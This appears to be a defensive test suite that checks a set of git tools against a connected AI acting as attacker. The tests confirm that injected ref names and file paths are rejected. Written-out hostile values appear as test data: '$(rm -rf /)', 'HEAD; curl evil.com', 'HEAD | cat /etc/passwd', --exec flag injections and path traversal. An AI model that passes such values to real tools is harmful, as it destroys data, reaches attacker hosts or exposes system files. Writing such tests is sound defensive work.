/**
 * Adversarial security audit for git tools.
 *
 * Same threat model: the connected AI is the attacker.
 * These tests attempt to abuse git tools for command injection,
 * path traversal, and information leakage.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { execFileSync } from "node:child_process";
import { initRepo } from "../../src/core/index.js";
import { handler as gitDiff } from "../../src/tools/git/gitDiff.js";
import { handler as gitBlame } from "../../src/tools/git/gitBlame.js";
import { handler as gitLog } from "../../src/tools/git/gitLog.js";
import { handler as gitStatus } from "../../src/tools/git/gitStatus.js";

let repoDir: string;

function gitCmd(...args: string[]): string {
  return execFileSync("git", args, {
    cwd: repoDir,
    encoding: "utf-8",
    stdio: ["pipe", "pipe", "pipe"],
  });
}

function touch(relativePath: string, content = ""): void {
  const full = path.join(repoDir, relativePath);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content);
}

beforeEach(() => {
  repoDir = fs.mkdtempSync(path.join(os.tmpdir(), "basalt-git-adv-"));
  gitCmd("init");
  gitCmd("config", "user.email", "test@test.com");
  gitCmd("config", "user.name", "Test");
  touch("app.ts", "console.log('hello');\n");
  gitCmd("add", ".");
  gitCmd("commit", "-m", "init");
  initRepo(repoDir);
});

afterEach(() => {
  fs.rmSync(repoDir, { recursive: true, force: true });
});

describe("git command injection via ref names", () => {
  it("rejects $(command) substitution", async () => {
    await expect(
      gitDiff({ ref: "$(rm -rf /)", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects backtick substitution", async () => {
    await expect(
      gitDiff({ ref: "`whoami`", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects semicolon chaining", async () => {
    await expect(
      gitDiff({ ref: "HEAD; curl evil.com", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects pipe chaining", async () => {
    await expect(
      gitDiff({ ref: "HEAD | cat /etc/passwd", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects ampersand backgrounding", async () => {
    await expect(
      gitDiff({ ref: "HEAD & malicious", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects newline injection", async () => {
    await expect(
      gitDiff({ ref: "HEAD\nmalicious", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects null byte injection", async () => {
    await expect(
      gitDiff({ ref: "HEAD\0--exec=evil", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects single quotes", async () => {
    await expect(
      gitDiff({ ref: "HEAD'--exec=evil", staged: false })
    ).rejects.toThrow(/disallowed/);
  });

  it("rejects double quotes", async () => {
    await expect(
      gitDiff({ ref: 'HEAD"--exec=evil', staged: false })
    ).rejects.toThrow(/disallowed/);
  });
});

describe("git flag injection via blame filePath", () => {
  it("rejects --exec flag disguised as filename", async () => {
    // The -- separator in gitBlame prevents this, but assertInsideVault
    // should also catch it since it won't resolve inside the repo
    await expect(
      gitBlame({ filePath: "--exec=evil" })
    ).rejects.toThrow();
  });

  it("rejects -o flag disguised as filename", async () => {
    await expect(
      gitBlame({ filePath: "-o /tmp/evil" })
    ).rejects.toThrow();
  });
});

describe("git blame path traversal", () => {
  it("rejects ../../../etc/passwd", async () => {
    await expect(
      gitBlame({ filePath: "../../../etc/passwd" })
    ).rejects.toThrow(/outside the vault|dot-prefixed/);
  });

  it("rejects absolute paths", async () => {
    await expect(
      gitBlame({ filePath: "/etc/passwd" })
    ).rejects.toThrow(/outside the vault/);
  });

  it("rejects null bytes in path", async () => {
    await expect(
      gitBlame({ filePath: "app\0.ts" })
    ).rejects.toThrow(/null bytes/);
  });

  it("rejects symlinked file", async () => {
    const outsideFile = path.join(
      fs.mkdtempSync(path.join(os.tmpdir(), "basalt-outside-")),
      "secret.ts"
    );
    fs.writeFileSync(outsideFile, "secret");
    fs.symlinkSync(outsideFile, path.join(repoDir, "link.ts"));

    await expect(
      gitBlame({ filePath: "link.ts" })
    ).rejects.toThrow();

    fs.rmSync(path.dirname(outsideFile), { recursive: true, force: true });
  });
});

describe("information leakage prevention", () => {
  it("gitStatus does not leak repo path", async () => {
    touch("newfile.ts", "content");
    const result = await gitStatus();
    expect(result).not.toContain(repoDir);
  });

  it("gitLog does not leak repo path", async () => {
    const result = await gitLog({ maxCount: 10 });
    expect(result).not.toContain(repoDir);
  });

  it("gitDiff does not leak repo path", async () => {
    touch("app.ts", "modified\n");
    const result = await gitDiff({ staged: false });
    expect(result).not.toContain(repoDir);
  });

  it("gitBlame does not leak repo path", async () => {
    const result = await gitBlame({ filePath: "app.ts" });
    expect(result).not.toContain(repoDir);
  });
});

describe("resource limits", () => {
  it("handles large diff output without crashing", async () => {
    // Create a large file to produce a big diff
    const bigContent = "line\n".repeat(10_000);
    touch("big.ts", bigContent);

    const result = await gitDiff({ staged: false });
    // Should return something (possibly truncated) without crashing
    expect(typeof result).toBe("string");
  });
});
